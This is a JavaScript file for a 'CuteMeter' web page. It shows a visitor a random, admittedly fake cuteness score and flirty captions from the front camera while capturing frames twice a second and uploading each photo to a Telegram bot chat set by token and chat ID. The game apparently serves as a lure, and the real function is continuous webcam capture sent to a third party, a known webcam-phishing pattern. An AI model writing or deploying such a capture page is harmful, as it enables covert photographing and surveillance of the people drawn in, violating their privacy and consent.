(() => {
  "use strict";
  const $ = (selector) => document.querySelector(selector);
  const video = $("#preview"), placeholder = $("#placeholder");
  const tokenInput = $("#botToken"), chatInput = $("#chatId");
  const startBtn = $("#startBtn"), stopBtn = $("#stopBtn");
  const cameraState = $("#cameraState"), sessionState = $("#sessionState");
  const sentCount = $("#sentCount"), failedCount = $("#failedCount"), logList = $("#log");
  const scoreEl = $("#score"), meterFill = $("#meterFill"), compliment = $("#compliment");
  const flirtTitle = $("#flirtTitle"), flirtSub = $("#flirtSub");
  const INTERVAL_MS = 500;
  const lines = [
    ["Certified heart-stealer 💘", "Eye contact: dangerously effective"],
    ["Main-character glow ✨", "The camera might need a minute"],
    ["Certified cutie alert 🎀", "Your smile has entered the chat"],
    ["Rizz status: suspiciously high 💌", "Somebody forgot their pickup line"],
    ["Flirting complete 💞", "Charm levels have reached the clouds"],
    ["Too cute to compute 🫧", "The imaginary algorithm is blushing"],
    ["Rom-com lead energy 🌷", "Cue the soft-focus montage"]
  ];
  let stream = null, captureTimer = null, scoreTimer = null;
  let running = false, inFlight = false, sent = 0, failed = 0, canvas = null;

  function log(message, type = "") {
    const empty = logList.querySelector(".muted");
    if (empty) empty.remove();
    const item = document.createElement("li");
    item.textContent = new Date().toLocaleTimeString() + " · " + message;
    if (type === "error") item.style.color = "#d65b82";
    if (type === "success") item.style.color = "#369e7b";
    logList.prepend(item);
    while (logList.children.length > 50) logList.lastElementChild.remove();
  }
  function updateScore() {
    const value = 87 + Math.floor(Math.random() * 14);
    const line = lines[Math.floor(Math.random() * lines.length)];
    scoreEl.innerHTML = value + "<small>/100</small>";
    meterFill.style.width = value + "%";
    compliment.textContent = line[0];
    flirtTitle.textContent = line[0].replace(/[💘✨🎀💌💞🫧🌷]/gu, "").trim().toUpperCase();
    flirtSub.textContent = line[1];
  }
  function updateCounts() { sentCount.textContent = sent; failedCount.textContent = failed; }
  function stopCamera() {
    if (stream) stream.getTracks().forEach(track => track.stop());
    stream = null;
    video.srcObject = null;
    video.classList.remove("active");
    placeholder.hidden = false;
    cameraState.innerHTML = "<i></i> Camera off";
    cameraState.classList.remove("live");
  }
  async function captureAndSend() {
    if (!running || inFlight || !stream || video.readyState < HTMLMediaElement.HAVE_CURRENT_DATA) return;
    inFlight = true;
    try {
      const context = canvas.getContext("2d", { alpha: false });
      context.filter = "brightness(1.04) saturate(1.07) contrast(.97)";
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      context.filter = "none";
      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", .84));
      if (!blob) throw new Error("Could not encode the camera frame.");
      const token = tokenInput.value.trim(), chatId = chatInput.value.trim();
      if (!token || !chatId) return;
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("photo", blob, "cutemeter-" + Date.now() + ".jpg");
      const response = await fetch("https://api.telegram.org/bot" + encodeURIComponent(token) + "/sendPhoto", { method: "POST", body: form });
      let result = null;
      try { result = await response.json(); } catch {}
      if (!response.ok || !result?.ok) {
        failed++;
        log("Telegram delivery failed: " + (result?.description || "HTTP " + response.status), "error");
      } else {
        sent++;
        log("A little glow delivered 💌 (" + sent + " sent)", "success");
      }
    } catch (error) {
      failed++;
      log("Upload failed: " + (error.message || error), "error");
    } finally {
      inFlight = false;
      updateCounts();
    }
  }
  async function start() {
    if (running) return;
    if (!navigator.mediaDevices?.getUserMedia) {
      log("Camera access requires a supported browser and HTTPS or localhost.", "error");
      return;
    }
    startBtn.disabled = true;
    log("Waking up the glow camera…");
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: false, video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } }
      });
      video.srcObject = stream;
      await video.play();
      canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      video.classList.add("active");
      placeholder.hidden = true;
      cameraState.innerHTML = "<i></i> Camera live";
      cameraState.classList.add("live");
      running = true;
      startBtn.disabled = true;
      stopBtn.disabled = false;
      sessionState.textContent = "Glowing ✨";
      updateScore();
      scoreTimer = setInterval(updateScore, 6500);
      if (tokenInput.value.trim() && chatInput.value.trim()) {
        log("Automatic Telegram stream started, targeting 2 frames/second.", "success");
        void captureAndSend();
        captureTimer = setInterval(() => void captureAndSend(), INTERVAL_MS);
      } else {
        log("CuteMeter is active. Enter both Telegram fields before starting to enable image delivery.");
      }
    } catch (error) {
      stopCamera();
      startBtn.disabled = false;
      log("Could not start camera: " + (error.message || error), "error");
    }
  }
  function stop() {
    running = false;
    if (captureTimer !== null) clearInterval(captureTimer);
    if (scoreTimer !== null) clearInterval(scoreTimer);
    captureTimer = scoreTimer = null;
    stopCamera();
    startBtn.disabled = false;
    stopBtn.disabled = true;
    sessionState.textContent = "Idle";
    log("Session ended. Camera released and automation stopped.");
  }
  startBtn.addEventListener("click", start);
  stopBtn.addEventListener("click", stop);
  $("#clearLogBtn").addEventListener("click", () => {
    logList.replaceChildren();
    const item = document.createElement("li");
    item.className = "muted";
    item.textContent = "Log cleared. Still cute, though. 🎀";
    logList.append(item);
  });
  window.addEventListener("pagehide", () => {
    running = false;
    if (captureTimer !== null) clearInterval(captureTimer);
    if (scoreTimer !== null) clearInterval(scoreTimer);
    stopCamera();
  });
})();